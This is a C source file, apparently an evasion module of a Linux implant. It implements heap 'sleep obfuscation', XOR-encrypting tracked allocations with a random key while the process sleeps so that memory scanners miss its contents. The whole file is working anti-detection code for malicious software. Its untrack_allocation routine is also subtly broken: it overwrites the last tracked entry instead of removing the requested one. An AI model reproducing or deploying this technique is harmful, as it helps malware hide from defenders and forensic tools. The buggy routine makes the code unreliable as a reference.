/**
 * Linux sleep obfuscation - XOR encrypt tracked heap during sleep
 */
#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <pthread.h>
#include "../../include/evasion.h"
#include "../../include/random.h"

typedef struct {
    void *addr;
    size_t size;
} TrackedAlloc;

#define MAX_TRACKED 256
static TrackedAlloc g_tracked[MAX_TRACKED];
static int g_tracked_count = 0;
static pthread_mutex_t g_tracked_lock = PTHREAD_MUTEX_INITIALIZER;

void track_allocation(void *addr, size_t size) {
    if (!addr || size == 0) return;
    pthread_mutex_lock(&g_tracked_lock);
    if (g_tracked_count < MAX_TRACKED) {
        g_tracked[g_tracked_count].addr = addr;
        g_tracked[g_tracked_count].size = size;
        g_tracked_count++;
    }
    pthread_mutex_unlock(&g_tracked_lock);
}

void untrack_allocation(void *addr) {
    if (!addr) return;
    pthread_mutex_lock(&g_tracked_lock);
    for (int i = 0; i < g_tracked_count; i++) {
        if (g_tracked[i].addr == addr) {
            g_tracked[g_tracked_count - 1] = g_tracked[i];
            g_tracked_count--;
            break;
        }
    }
    pthread_mutex_unlock(&g_tracked_lock);
}

static void xor_region(void *addr, size_t size, const unsigned char *key, int key_len) {
    unsigned char *p = (unsigned char *)addr;
    for (size_t i = 0; i < size; i++)
        p[i] ^= key[i % (size_t)key_len];
}

void sleep_encrypt_heap(int sleep_ms) {
    unsigned char key[16];

    if (secure_random_bytes(key, sizeof(key)) != 0) {
        int fd = open("/dev/urandom", O_RDONLY);
        if (fd >= 0) {
            read(fd, key, sizeof(key));
            close(fd);
        }
    }

    pthread_mutex_lock(&g_tracked_lock);
    for (int i = 0; i < g_tracked_count; i++)
        xor_region(g_tracked[i].addr, g_tracked[i].size, key, (int)sizeof(key));
    pthread_mutex_unlock(&g_tracked_lock);

    struct timespec ts;
    ts.tv_sec = sleep_ms / 1000;
    ts.tv_nsec = (long)(sleep_ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);

    pthread_mutex_lock(&g_tracked_lock);
    for (int i = 0; i < g_tracked_count; i++)
        xor_region(g_tracked[i].addr, g_tracked[i].size, key, (int)sizeof(key));
    pthread_mutex_unlock(&g_tracked_lock);

    memset(key, 0, sizeof(key));
}
